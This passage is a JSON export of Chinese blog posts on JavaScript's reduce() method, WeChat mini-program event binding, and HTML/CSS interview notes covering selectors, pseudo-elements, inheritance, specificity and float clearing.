[{"id":"0dd2f8e1d48b223c2f63dbed14392a9e","title":"JS数组reduce()方法详解及高级技巧","content":"\n\n\n\n\n\n\n\n\nreduce()方法可以搞定的东西，for循环，或者forEach方法有时候也可以搞定，那为啥要用reduce()？这个问题，之前我也想过，要说原因还真找不到，唯一能找到的是：通往成功的道路有很多，但是总有一条路是最捷径的，亦或许reduce()逼格更高…\n1、语法arr.reduce(callback,[initialValue])\n\nreduce 为数组中的每一个元素依次执行回调函数，不包括数组中被删除或从未被赋值的元素，接受四个参数：初始值（或者上一次回调函数的返回值），当前元素值，当前索引，调用 reduce 的数组。\ncallback （执行数组中每个值的函数，包含四个参数）\n\n    1、previousValue （上一次调用回调返回的值，或者是提供的初始值（initialValue））\n    2、currentValue （数组中当前被处理的元素）\n    3、index （当前元素在数组中的索引）\n    4、array （调用 reduce 的数组）\n\ninitialValue （作为第一次调用 callback 的第一个参数。）\n\n2、实例解析 initialValue 参数先看第一个例子：\nvar arr = [1, 2, 3, 4];\nvar sum = arr.reduce(function(prev, cur, index, arr) &#123;\n    console.log(prev, cur, index);\n    return prev + cur;\n&#125;)\nconsole.log(arr, sum);\n\n\n\n\n\n\n\n\n\n\n打印结果： 1 2 1 3 3 2 6 4 3 [1, 2, 3, 4] 10\n这里可以看出，上面的例子index是从1开始的，第一次的prev的值是数组的第一个值。数组长度是4，但是reduce函数循环3次。\n再看第二个例子：\nvar  arr = [1, 2, 3, 4];\nvar sum = arr.reduce(function(prev, cur, index, arr) &#123;\n    console.log(prev, cur, index);\n    return prev + cur;\n&#125;，0) //注意这里设置了初始值\nconsole.log(arr, sum);\n\n\n\n\n\n\n\n\n\n\n打印结果： 0 1 0 1 2 1 3 3 2 6 4 3 [1, 2, 3, 4] 10\n这个例子index是从0开始的，第一次的prev的值是我们设置的初始值0，数组长度是4，reduce函数循环4次。\n结论：如果没有提供initialValue，reduce 会从索引1的地方开始执行 callback 方法，跳过第一个索引。如果提供initialValue，从索引0开始。\n注意：如果这个数组为空，运用reduce是什么情况？\nvar  arr = [];\nvar sum = arr.reduce(function(prev, cur, index, arr) &#123;\n    console.log(prev, cur, index);\n    return prev + cur;\n&#125;)\n//报错，\"TypeError: Reduce of empty array with no initial value\"\n\n但是要是我们设置了初始值就不会报错，如下：\nvar  arr = [];\nvar sum = arr.reduce(function(prev, cur, index, arr) &#123;\n    console.log(prev, cur, index);\n    return prev + cur;\n&#125;，0)\nconsole.log(arr, sum); // [] 0\n\n所以一般来说我们提供初始值通常更安全\n3、reduce的简单用法当然最简单的就是我们常用的数组求和，求乘积了。\nvar  arr = [1, 2, 3, 4];\nvar sum = arr.reduce((x,y)=>x+y)\nvar mul = arr.reduce((x,y)=>x*y)\nconsole.log( sum ); //求和，10\nconsole.log( mul ); //求乘积，24\n\n4、reduce的高级用法（1）计算数组中每个元素出现的次数\nlet names = ['Alice', 'Bob', 'Tiff', 'Bruce', 'Alice'];\n\nlet nameNum = names.reduce((pre,cur)=>&#123;\n  if(cur in pre)&#123;\n    pre[cur]++\n  &#125;else&#123;\n    pre[cur] = 1 \n  &#125;\n  return pre\n&#125;,&#123;&#125;)\nconsole.log(nameNum); //&#123;Alice: 2, Bob: 1, Tiff: 1, Bruce: 1&#125;\n\n（2）数组去重\nlet arr = [1,2,3,4,4,1]\nlet newArr = arr.reduce((pre,cur)=>&#123;\n    if(!pre.includes(cur))&#123;\n      return pre.concat(cur)\n    &#125;else&#123;\n      return pre\n    &#125;\n&#125;,[])\nconsole.log(newArr);// [1, 2, 3, 4]\n\n（3）将二维数组转化为一维\nlet arr = [[0, 1], [2, 3], [4, 5]]\nlet newArr = arr.reduce((pre,cur)=>&#123;\n    return pre.concat(cur)\n&#125;,[])\nconsole.log(newArr); // [0, 1, 2, 3, 4, 5]\n\n（3）将多维数组转化为一维\nlet arr = [[0, 1], [2, 3], [4,[5,6,7]]]\nconst newArr = function(arr)&#123;\n   return arr.reduce((pre,cur)=>pre.concat(Array.isArray(cur)?newArr(cur):cur),[])\n&#125;\nconsole.log(newArr(arr)); //[0, 1, 2, 3, 4, 5, 6, 7]\n\n（4）、对象里的属性求和\nvar result = [\n    &#123;\n        subject: 'math',\n        score: 10\n    &#125;,\n    &#123;\n        subject: 'chinese',\n        score: 20\n    &#125;,\n    &#123;\n        subject: 'english',\n        score: 30\n    &#125;\n];\n\nvar sum = result.reduce(function(prev, cur) &#123;\n    return cur.score + prev;\n&#125;, 0);\nconsole.log(sum) //60\n\n\n\n作者：littleTank链接：https://www.jianshu.com/p/e375ba1cfc47来源：简书著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n","slug":"JS数组reduce-方法详解及高级技巧","date":"2022-05-23T03:47:00.000Z","categories_index":"学习笔记","tags_index":"Javascript","author_index":"kif"},{"id":"add7208ee63417129b8b6e45029f606b","title":"小程序事件之bind 、catch 、capture-bind和capture-catch的区别","content":"小程序事件之bind 、catch 、capture-bind和capture-catch的区别事件分类事件分为冒泡事件和非冒泡事件\n冒泡事件：当一个组件上的事件被触发后，该事件会向父节点传递。\n非冒泡事件：当一个组件上的事件被触发后，该事件不会向父节点传递。\n\n事件的绑定：\n  bind和catch都是用来绑定事件的，与 bind 不同， catch 会阻止事件向上冒泡\n&lt;view id=\"outer\" bindtap=\"handleTap1\">\n  outer view\n  &lt;view id=\"middle\" catchtap=\"handleTap2\">\n    middle view\n    &lt;view id=\"inner\" bindtap=\"handleTap3\">\n      inner view\n    &lt;/view>\n  &lt;/view>\n&lt;/view>\n\n\n\n上例中，点击 inner view 会先后调用handleTap3和handleTap2(因为tap事件会冒泡到 middle view，而 middle view 阻止了 tap 事件冒泡，不再向父节点传递)，点击 middle view 会触发handleTap2，点击 outer view 会触发handleTap1\n事件的捕获阶段 \\1. 事件是有两个阶段的：捕获阶段 和 冒泡阶段， 且捕获阶段位于冒泡阶段之前。\n \\2. 在捕获阶段中，事件到达节点的顺序与冒泡阶段恰好相反\n \\3. 在捕获阶段监听事件时，可以采用capture-bind、capture-catch关键字，后者将中断捕获阶段和取消冒泡阶段\n 示例：\n点击 inner view 会先后调用handleTap2、handleTap4、handleTap3、handleTap1\n\n\n&lt;view id=\"outer\" bind:touchstart=\"handleTap1\" capture-bind:touchstart=\"handleTap2\">\n  outer view\n  &lt;view id=\"inner\" bind:touchstart=\"handleTap3\" capture-bind:touchstart=\"handleTap4\">\n    inner view\n  &lt;/view>\n&lt;/view>\n\n\n\n\n\n 如果把上面的代码改成如下，将只会触发handleTap2\n\n\n&lt;view id=\"outer\" bind:touchstart=\"handleTap1\" capture-catch:touchstart=\"handleTap2\">\n  outer view\n  &lt;view id=\"inner\" bind:touchstart=\"handleTap3\" capture-bind:touchstart=\"handleTap4\">\n    inner view\n  &lt;/view>\n\n\n\n\n\n\n\n转载自：\nhttps://www.cnblogs.com/hzhuxin/p/15074300.html\n","slug":"小程序事件之bind-、catch-、capture-bind和capture-catch的区别","date":"2022-05-22T12:34:00.000Z","categories_index":"","tags_index":"微信小程序","author_index":"kif"},{"id":"4bd7150fd9e4dc678a3c2ce6062a159a","title":"前端面试题目","content":"html基础1.自定义列表&lt;!DOCTYPE html>\n&lt;html lang=\"zh\">\n&lt;head>\n\t&lt;meta charset=\"UTF-8\">\n\t&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n\t&lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n\t&lt;title>&lt;/title>\n&lt;/head>\n&lt;body>\n\t&lt;dl>\n\t\t&lt;dt>&lt;/dt>\n\t\t&lt;dd>&lt;/dd>\n\t\t&lt;dd>&lt;/dd>\n\t&lt;/dl>\n&lt;/body>\n\n\n1.dt中一般是你的列表的表头2.dd中相当于ul的li中相同的内容\n自定义列表一般用于以下内容\n\n2.多媒体标签之音频标签音频标签以为代表，音频标签属性如下：autoplay&#x3D;”autoplay” 打开页面后，音频会自动播放controls&#x3D;”controls” 在页面显示控件，比如播放按钮loop&#x3D;”loop” 循环播放当前音频src&#x3D;”url” 导入音频文件地址(url是文件地址的统称举例)注意：1.谷歌浏览器把autoplay(自动播放)属性给禁用了，所以在谷歌浏览器中没法实现音频自动播放。2.因为不同浏览器的支持格式不同，我们采取的解决方案是为一个音频准备多个如格式的文件，举例如下：\n&lt;audio controls=\"controls\">\n        &lt;source src=\"E:\\HTML+CSS\\案例\\media\\案例1.mp3\" type=\"audio/mpeg\">\n        &lt;source src=\"E:\\HTML+CSS\\案例\\media\\案例1.ogg\" type=\"audio/ogg\">\n            您的浏览器需要升级，目前不支持audio播放\n &lt;/audio>\n\n\n3.onerror 事件onerror 事件在视频&#x2F;音频（audio&#x2F;video）数据加载期间发生错误时触发。\n&lt;video onerror&#x3D;&quot;myFunction()&quot;&gt;\n\n\n\n\n\n4、为什么link用href获取资源 script和img用src参考答案：\nsrc用于替换当前元素，href用于在当前文档和引用资源之间确立联系。\nsrc\n\nsrc是source的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求src资源时会将其指向的资源下载并应用到文档内，例如js脚本，img图片和frame等元素\n&lt;script src =\"js.js\">&lt;/script> \n\n 当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架 等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部\nhref\n\nhref是Hypertext Reference的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接\n\n在文档中添加link标签，浏览器会识别该文档为css文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用link方式来加载css，而不是使用@import方式\n&lt;link href=\"common.css\" rel=\"stylesheet\"/>\n\nCSS1.css选择某一个 (CSS :first-child 选择器,CSS选择器——伪类选择器)q:请将html模块中ul列表的第2个li标签和第4个li标签的背景颜色设置成”rgb(255, 0, 0)”。\n&lt;html>\n    &lt;head>\n        &lt;meta charset=utf-8>\n        &lt;style type=\"text/css\">\n            /*补全代码*/\n            \n        &lt;/style>\n    &lt;/head>\n    &lt;body>\n        &lt;ul>\n            &lt;li>1&lt;/li>\n            &lt;li>2&lt;/li>\n            &lt;li>3&lt;/li>\n            &lt;li>4&lt;/li>\n        &lt;/ul>\n    &lt;/body>\n&lt;/html>\n\nCSS :first-child 选择器：:first-child 选择器用于选取属于其父元素的首个子元素的指定选择器。\nul > :first-child + li&#123;\n    margin-right: 50px;\n&#125;\n\nul > :first-child + li + li+ li&#123;\n    margin-right: 50px;\n&#125;\n\n\n\n2、CSS 边框属性p\n  &#123;\n  border:5px solid red;\n  &#125;\n\n可以按顺序设置如下属性：\n\nborder-width\nborder-style\nborder-color\n\nborder-style可能的值\n\n\n值\n描述\n\n\n\nnone\n定义无边框。\n\n\nhidden\n与 “none” 相同。不过应用于表时除外，对于表，hidden 用于解决边框冲突。\n\n\ndotted\n定义点状边框。在大多数浏览器中呈现为实线。\n\n\ndashed\n定义虚线。在大多数浏览器中呈现为实线。\n\n\nsolid\n定义实线。\n\n\ndouble\n定义双线。双线的宽度等于 border-width 的值。\n\n\ngroove\n定义 3D 凹槽边框。其效果取决于 border-color 的值。\n\n\nridge\n定义 3D 垄状边框。其效果取决于 border-color 的值。\n\n\ninset\n定义 3D inset 边框。其效果取决于 border-color 的值。\n\n\noutset\n定义 3D outset 边框。其效果取决于 border-color 的值。\n\n\ninherit\n规定应该从父元素继承边框样式。\n\n\neg:\n圣诞节来啦！请用CSS给你的朋友们制作一颗圣诞树吧~这颗圣诞树描述起来是这样的：\n1. &quot;topbranch&quot;是圣诞树的上枝叶，该上枝叶仅通过边框属性、左浮动、左外边距即可实现。边框的属性依次是：宽度为100px、是直线、颜色为green（未显示的边框颜色都为透明）\n2. &quot;middleBranch&quot;是圣诞树的中枝叶，该上枝叶仅通过边框属性即可实现。边框的属性依次是：宽度为200px、是直线、颜色为green（未显示的边框颜色都为透明）\n3. &quot;base&quot;是圣诞树的树干，该树干仅通过左外边距实现居中于中枝叶。树干的宽度、高度分别为70px、200px，颜色为gray。\n注意：\n1. 上枝叶、树干的居中都是通过左外边距实现的\n2. 没有显示的边框，其属性都是透明（属性）\n3. 仅通过border属性完成边框的所有属性设置\n\n\n&lt;!DOCTYPE html>\n&lt;html>\n    &lt;head>\n        &lt;meta charset=utf-8>\n        &lt;style type=\"text/css\">\n            .topbranch &#123;\n                width: 0px;\n                height: 0px;\n                /*\n                * TODO: 上枝叶效果\n                */\n               float:left;\n               border-bottom:100px solid green;\n               border-left:100px solid transparent;\n               border-right:100px solid transparent;\n               border-top:100px solid transparent;\n               margin-left:100px\n               \n                \n            &#125;\n            .middleBranch &#123;\n                width: 0px;\n                height: 0px;\n                /*\n                * TODO: 中枝叶效果\n                */\n                border-bottom:200px solid green;\n                border-left:200px solid transparent;\n                 border-top:200px solid transparent;\n                 border-right:200px solid transparent;\n                \n                \n            &#125;\n            .base &#123;\n                /*\n                * TODO: 树干效果\n                */\n                width:70px;\n                height:200px;\n                background-color:gray;\n                float:left;\n                margin-left:165px\n                \n            &#125;\n        &lt;/style>\n    &lt;/head>\n    &lt;body>\n    \t&lt;section class=\"topbranch\">&lt;/section>\n        &lt;section class=\"middleBranch\">&lt;/section>\n        &lt;section class=\"base\">&lt;/section>\n    &lt;/body>\n&lt;/html>\n\n3、 CSS选择器——伪元素伪元素是一个附加在选择器末尾的关键词，通过伪元素您不需要借助元素的 ID 或 class 属性就可以对被选择元素的特定部分定义样式。例如通过伪元素您可以设置段落中第一个字母的样式，或者在元素之前、之后插入一些内容等等。\n在 CSS1 和 CSS2 中，伪元素的使用与伪类相同，都是使一个冒号:与选择器相连。但在 CSS3 中，将伪元素单冒号的使用方法改为了使用双冒号::，以此来区分伪类和伪元素。因此，建议在使用伪元素时使用双冒号而不是单冒号。\nselector::pseudo-element &#123;\n  property: value;\n&#125;\n\n其中，selector 为选择器，pseudo-element 为伪元素的名称，property 为 CSS 中的属性，value 为属性对应的值。\nCSS 中提供了一系列的伪元素，如下表所示：\n\n\n\n伪元素\n例子\n例子描述\n\n\n\n::after\np::after\n在每个  元素之后插入内容\n\n\n::before\np::before\n在每个  元素之前插入内容\n\n\n::first-letter\np::first-letter\n匹配每个  元素中内容的首字母\n\n\n::first-line\np::first-line\n匹配每个  元素中内容的首行\n\n\n::selection\np::selection\n匹配用户选择的元素部分\n\n\n::placeholder\ninput::placeholder\n匹配每个表单输入框（例如 ）的 placeholder 属性\n\n\n1. ::after伪元素 ::after 能够在指定元素的后面插入一些内容，在 ::after 中需要使用 content 属性来定义要追加的内容，而且在 ::after 中必须定义 content 属性才会生效（没有需要插入的内容时可以将 content 属性的值定义为空&quot;&quot;）。\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n    &lt;style>\n        p.one::after &#123;\n            content:\"\";\n            display: inline-block;\n            width: 50px;\n            height: 10px;\n            background: blue;\n        &#125;\n        p.two::after &#123;\n            content:\"要插入的内容\";\n            color: red;\n            font-size: 6px;\n        &#125;\n        p.three::after &#123;\n            content: url('./smiley.gif');\n            position: relative;\n            top: 8px;\n        &#125;\n    &lt;/style>\n&lt;/head>\n&lt;body>\n    &lt;p class=\"one\">伪元素 ::after&lt;/p>\n    &lt;p class=\"two\">伪元素 ::after&lt;/p>\n    &lt;p class=\"three\">伪元素 ::after&lt;/p>\n&lt;/body>\n&lt;/html>\n\n\n2. ::before伪元素 ::before 能够在指定元素的前面插入一些内容。与 ::after 相似，::before 中也需要使用 content 属性来定义要追加的内容，而且在 ::before 中必须定义 content 属性才会生效（没有需要插入的内容时可以将 content 属性的值定义为空&quot;&quot;）。\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n    &lt;style>\n        p.one::before &#123;\n            content:\"\";\n            display: inline-block;\n            width: 50px;\n            height: 10px;\n            background: blue;\n        &#125;\n        p.two::before &#123;\n            content:\"要插入的内容\";\n            color: red;\n            font-size: 6px;\n        &#125;\n        p.three::before &#123;\n            content: url('./smiley.gif');\n            position: relative;\n            top: 8px;\n        &#125;\n    &lt;/style>\n&lt;/head>\n&lt;body>\n    &lt;p class=\"one\">伪元素 ::before&lt;/p>\n    &lt;p class=\"two\">伪元素 ::before&lt;/p>\n    &lt;p class=\"three\">伪元素 ::before&lt;/p>\n&lt;/body>\n&lt;/html>\n\n\n3. ::first-letter伪元素 ::first-letter 用来设置指定元素中内容第一个字符的样式，通常用来配合 font-size 和 float 属性制作首字下沉效果。需要注意的是，伪元素 ::first-letter 仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。\n下面通过示例来演示伪元素 ::first-letter 的使用：\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n    &lt;style>\n        p::first-letter&#123;\n            font-size: 2em;\n            color: blue;\n        &#125;\n    &lt;/style>\n&lt;/head>\n&lt;body>\n    &lt;p>伪元素 ::first-letter&lt;/p>\n&lt;/body>\n&lt;/html>\n\n\n4. ::first-line伪元素 ::first-line 用来设置指定元素中内容第一行的样式，与 ::first-letter 类似，伪元素 ::first-line 也仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。\n下面通过示例来演示伪元素 ::first-line 的使用：\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n    &lt;style>\n        p::first-line&#123;\n            font-size: 1.5em;\n            color: blue;\n            font-weight: bold;\n        &#125;\n    &lt;/style>\n&lt;/head>\n&lt;body>\n    &lt;p>伪元素 ::first-line 用来设置指定元素中内容第一行的样式，与 ::first-letter 类似，伪元素 ::first-line 也仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。&lt;/p>\n&lt;/body>\n&lt;/html>\n\n\n5. ::selection伪元素 ::selection 用来设置对象被选中时的样式，需要注意的是，伪元素 ::selection 中只能定义元素被选中时的 color、background、cursor、outline 以及 text-shadow（IE11 尚不支持定义该属性）等属性。\n下面通过示例来演示伪元素 ::selection 的使用：\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n    &lt;style>\n        p::selection&#123;\n            color: red;\n            background-color: #CCC;\n        &#125;\n    &lt;/style>\n&lt;/head>\n&lt;body>\n    &lt;p>伪元素 ::selection 用来设置对象被选中时的样式，需要注意的是，伪元素 ::selection 中只能定义元素被选中时的 color、background、cursor、outline 以及 text-shadow（IE11 尚不支持定义该属性）等属性。 &lt;/p>\n&lt;/body>\n&lt;/html>\n\n运行结果如下图所示：\n图：伪元素 ::selection 的使用\n6. ::placeholder伪元素 ::placeholder 用来设置表单元素（input、textarea 元素）的占位文本（通过 HTML 的 placeholder 属性设置的文本），示例代码如下：\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;style&gt;\n        input.text::placeholder&#123;\n            color: red;\n            background-color: #CCC;\n        &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n    &lt;input placeholder&#x3D;&quot;请输入一段文本&quot;&gt;未使用伪元素 ::placeholder&lt;br&gt;\n    &lt;input placeholder&#x3D;&quot;请输入一段文本&quot; class&#x3D;&quot;text&quot;&gt;使用伪元素 ::placeholder 的效果\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n运行结果如下图所示：\n\n4、圆角border-radius\n\n5、浮动和清除浮动清除浮动:\n父元素内联块元素 inline-block\n\n.father&#123;\n display:inline-block\n&#125;\n\n6、固定定位position:fixed\n\n\n\n7、CSS单位（一）em和rem简单的说\n\nem: 就是字体大小，根据元素自身的字体大小来定，如果自身没有定义字体大小，则继承父元素的字体大小，即1em &#x3D; 1 font-size;\nrem: 和em差不多，可以看成是root-em，是根据根元素的字体大小来定义的，即html设置的字体大小来定义，默认html的字体大小是16px；\n\n8、继承相关css的继承：就是给父级设置一些属性，子级继承了父级的该属性，这就是我们的css中的继承。 官方解释，继承是一种规则，它允许样式不仅应用于特定的html标签元素，而且应用于其后代元素。\n无继承性的属性\n1、display：规定元素应该生成的框的类型\n2、文本属性：\nvertical-align：垂直文本对齐\ntext-decoration：规定添加到文本的装饰\ntext-shadow：文本阴影效果\nwhite-space：空白符的处理\nunicode-bidi：设置文本的方向\n3、盒子模型的属性：width、height、margin 、margin-top、margin-right、margin-bottom、margin-left、border、 border-style、border-top-style、border-right-style、border-bottom-style、border-left-style、border-width、border-top-width、border-right-right、border-bottom-width、border-left-width、border-color、border-top-color、border-right-color、border-bottom-color、border-left-color、border-top、border-right、border-bottom、border-left、padding、padding-top、padding-right、padding-bottom、padding-left\n4、背景属性：background、background-color、background-image、background-repeat、background-position、background-attachment\n5、定位属性：float、clear、position、top、right、bottom、left、min-width、min-height、max-width、max-height、overflow、clip、z-index\n6、生成内容属性：content、counter-reset、counter-increment\n7、轮廓样式属性：outline-style、outline-width、outline-color、outline\n8、页面样式属性：size、page-break-before、page-break-after\n9、声音样式属性：pause-before、pause-after、pause、cue-before、cue-after、cue、play-during\n有继承性的属性\n1、字体系列属性\nfont：组合字体\nfont-family：规定元素的字体系列\nfont-weight：设置字体的粗细\nfont-size：设置字体的尺寸\nfont-style：定义字体的风格\nfont-variant：设置小型大写字母的字体显示文本，这意味着所有的小写字母均会被转换为大写，但是所有使用小型大写 字体的字母与其余文本相比，其字体尺寸更小。\nfont-stretch：对当前的 font-family 进行伸缩变形。所有主流浏览器都不支持。\nfont-size-adjust：为某个元素规定一个 aspect 值，这样就可以保持首选字体的 x-height。\n2、文本系列属性\ntext-indent：文本缩进\ntext-align：文本水平对齐\nline-height：行高\nword-spacing：增加或减少单词间的空白（即字间隔）\nletter-spacing：增加或减少字符间的空白（字符间距）\ntext-transform：控制文本大小写\ndirection：规定文本的书写方向\ncolor：文本颜色 a元素除外\n3、元素可见性：visibility\n4、表格布局属性：caption-side、border-collapse、border-spacing、empty-cells、table-layout\n5、列表布局属性：list-style-type、list-style-image、list-style-position、list-style\n6、生成内容属性：quotes\n7、光标属性：cursor\n8、页面样式属性：page、page-break-inside、windows、orphans\n9、声音样式属性：speak、speak-punctuation、speak-numeral、speak-header、speech-rate、volume、voice-family、 pitch、pitch-range、stress、richness、、azimuth、elevation\n所有元素可以继承的属性\n1、元素可见性：visibility\n2、光标属性：cursor\n内联元素可以继承的属性\n1、字体系列属性\n2、除text-indent、text-align之外的文本系列属性\n块级元素可以继承的属性\n1、text-indent、text-align\n9、css预处理工具参考答案：\nCSS 预处理器是一个能让你通过预处理器自己独有的语法来生成CSS的程序。\ncss预处理器种类繁多，三种主流css预处理器是Less、Sass（Scss）及Stylus；它们各自的背景如下:\nSass：\n2007年诞生，最早也是最成熟的CSS预处理器，拥有ruby社区的支持和compass这一最强大的css框架，目前受LESS影响，已经进化到了全面兼容CSS的SCSS（SCSS 需要使用分号和花括号而不是换行和缩进）。\nLess：\n2009年出现，受SASS的影响较大，但又使用CSS的语法，让大部分开发者和设计师更容易上手，在ruby社区之外支持者远超过SASS。其缺点是比起SASS来，可编程功能不够。优点是简单和兼容CSS，反过来也影响了SASS演变到了SCSS的时代，著名的Twitter Bootstrap就是采用LESS做底层语言的。\nStylus：\n2010年产生，来自Node.js社区，主要用来给Node项目进行CSS预处理支持，在此社区之内有一定支持者，在广泛的意义上人气还完全不如SASS和LESS。\n比较\n在使用 CSS 预处理器之前最重要的是理解语法，幸运的是基本上大多数预处理器的语法跟 CSS 都差不多。\n首先 Sass 和 Less 都使用的是标准的 CSS 语法，因此如果可以很方便的将已有的 CSS 代码转为预处理器代码，默认 Sass 使用 .sass 扩展名，而 Less 使用 .less 扩展名。\nh1 &#123;\n  color: #0982C1;\n&#125;\n\n这是一个再普通不过的，不过 Sass 同时也支持老的语法，就是不包含花括号和分号的方式：\nh1\ncolor: #0982c1\n\n而 Stylus 支持的语法要更多样性一点，它默认使用 .styl 的文件扩展名，下面是 Stylus 支持的语法\n/* style.styl */\nh1 &#123;\n  color: #0982C1;\n&#125;\n/* omit brackets */\nh1\ncolor: #0982C1;\n/* omit colons and semi-colons */\nh1\ncolor #0982C1\n\n可以在同一个样式单中使用不同的变量，例如下面的写法也不会报错：\nh1 &#123;\n  color #0982c1\n&#125;\nh2\nfont-size: 1.2em\n\n\n\n10、行内元素和块级元素什么区别，然后怎么相互转换参考答案:\n块级元素\n1.总是从新的一行开始，即各个块级元素独占一行，默认垂直向下排列；\n2.高度、宽度、margin及padding都是可控的，设置有效，有边距效果；\n3.宽度没有设置时，默认为100%；\n4.块级元素中可以包含块级元素和行内元素。\n行内元素\n1.和其他元素都在一行，即行内元素和其他行内元素都会在一条水平线上排列；\n2.高度、宽度是不可控的，设置无效，由内容决定。\n3.根据标签语义化的理念，行内元素最好只包含行内元素，不包含块级元素。\n转换\n当然块级元素与行内元素之间的特性是可以相互转换的。HTML可以将元素分为行内元素、块状元素和行内块状元素三种。\n使用display属性能够将三者任意转换：\n(1)display:inline;转换为行内元素；\n(2)display:block;转换为块状元素；\n(3)display:inline-block;转换为行内块状元素。\n11、样式优先级参考答案：\n样式类型\n样式类型分为三类\n\n行间\n\n&lt;h1 style=\"font-size:12px;color:#000;\">我的行间CSS样式。&lt;/h1>\n\n\n内联\n\n&lt;style type=\"text/css\">\n   h1&#123;font-size:12px;\n      color:#000;\n      &#125;\n&lt;/style>\n\n\n外部\n\n&lt;link rel=\"stylesheet\" href=\"css/style.css\">\n\n选择器类型\n\n1、ID　　#id\n2、class　　.class\n3、标签　　p\n4、通用　　*\n5、属性　　[type&#x3D;”text”]\n6、伪类　　:hover\n7、伪元素　　::first-line\n8、子选择器、相邻选择器\n\n权重计算规则\n第一等：代表内联样式，如: style&#x3D;””，权值为1000。第二等：代表ID选择器，如：#content，权值为0100。第三等：代表类，伪类和属性选择器，如.content，权值为0010。第四等：代表类型选择器和伪元素选择器，如div p，权值为0001。通配符、子选择器、相邻选择器等的。如*、&gt;、+,权值为0000。继承的样式没有权值。\n比较规则\n遵循如下法则：\n\n选择器都有一个权值，权值越大越优先；\n当权值相等时，后出现的样式表设置要优于先出现的样式表设置；\n创作者的规则高于浏览者：即网页编写者设置的 CSS 样式的优先权高于浏览器所设置的样式；\n继承的 CSS 样式不如后来指定的 CSS 样式；\n在同一组属性设置中标有!important规则的优先级最大\n通配符、子选择器、相邻选择器等的。虽然权值为0000，但是也比继承的样式优先。\n\n！important\n\n!important 的作用是提升优先级，换句话说。加了这句的样式的优先级是最高的（比内联样式的优先级还高)。\n\n&lt;style> \np&#123;\n    color:red !important;\n&#125; \n&lt;/style>\n&lt;p style=\"color:blue;\">我显示红色&lt;/p>\n\n\nie7+和别的浏览器对important的这种作用的支持度都很好。只有ie6有些bug\n\np&#123;\n      color:red !important;\n      color:blue;    \n &#125;//会显示blue\n\n但是这并不说明ie6不支持important，只是支持上有些bug。看下面\np&#123;\n     color:red !important;  \n&#125;\np&#123;\n    color:blue;  \n&#125; //这样就会显示的是red。说明ie6还是支持important的。&lt;/pre>\n\n12、盒子塌陷是什么？参考答案：\n盒子塌陷\n本应该在父盒子内部的元素跑到了外部。\n原因：\n当父元素没设置足够大小的时候，而子元素设置了浮动的属性，子元素就会跳出父元素的边界（脱离文档流），尤其是当父元素的高度为auto时，而父元素中又没有其它非浮动的可见元素时，父盒子的高度就会直接塌陷为零， 我们称这是CSS高度塌陷。\n关于盒子塌陷的几种解决方法\n（1）最简单，直接，粗暴的方法就是盒子大小写死，给每个盒子设定固定的width和height，直到合适为止，这样的好处是简单方便，兼容性好，适合只改动少量内容不涉及盒子排布的版面。缺点是非自适应，浏览器的窗口大小直接影响用户体验。\n（2）给外部的父盒子也添加浮动，让其也脱离标准文档流，这种方法方便，但是对页面的布局不是很友好，不易维护。\n（3）给父盒子添加overflow属性。\n overflow:auto; 有可能出现滚动条，影响美观。\n overflow:hidden; 可能会带来内容不可见的问题。\n（4）父盒子里最下方引入清除浮动块。最简单的有：\n&lt;br style=\"clear:both;\"/>\n\n有很多人是这么解决的，但是我们并不推荐，因为其引入了不必要的冗余元素 。\n (5)用after伪元素清除浮动\n给外部盒子的after伪元素设置clear属性，再隐藏它\n这其实是对空盒子方案的改进，一种纯CSS的解决方案，不用引入冗余元素。\n.clearfix &#123;*zoom: 1;&#125;\n\n.clearfix:before,.clearfix:after &#123;\n\ndisplay: table;\n\nline-height: 0;\n\ncontent: \"\";\n\n&#125;\n\n.clearfix:after &#123;clear: both;&#125;\n\n这也是bootstrap框架采用的清除浮动的方法。\n这是一种纯CSS的解决浮动造成盒子塌陷方法，没有引入任何冗余元素，推荐使用此方法来解决CSS盒子塌陷。\n备注：第五种方法虽好，但是低版本IE不兼容，具体选择哪种解决方法，可根据实际情况决定。\n(6) 给父盒子添加border\n(7) 给父盒子设置padding-top\n13、css 伪类与伪元素区别参考答案：\n\n伪类(pseudo-classes)\n\n\n其核⼼就是⽤来选择DOM树之外的信息,不能够被普通选择器选择的⽂档之外的元素，⽤来添加⼀些选择器的特殊效果。\n⽐如:hover :active :visited :link :visited :first-child :focus :lang等\n由于状态的变化是⾮静态的，所以元素达到⼀个特定状态时，它可能得到⼀个伪类的样式；当状态改变时，它⼜会失去这个样式。\n由此可以看出，它的功能和class有些类似，但它是基于⽂档之外的抽象，所以叫 伪类。\n\n\n伪元素(Pseudo-elements)\n\n\nDOM树没有定义的虚拟元素\n核⼼就是需要创建通常不存在于⽂档中的元素，\n⽐如::before ::after 它选择的是元素指定内容，表示选择元素内容的之前内容或之后内容。\n伪元素控制的内容和元素是没有差别的，但是它本身只是基于元素的抽象，并不存在于⽂档中，所以称为伪元素。⽤于将特殊的效果添加到某些选择器\n\n\n伪类与伪元素的区别\n\n\n表示⽅法\nCSS2 中伪类、伪元素都是以单冒号:表示,\nCSS2.1 后规定伪类⽤单冒号表示,伪元素⽤双冒号::表示，\n浏览器同样接受 CSS2 时代已经存在的伪元素(:before, :after, :first�line, :first-letter 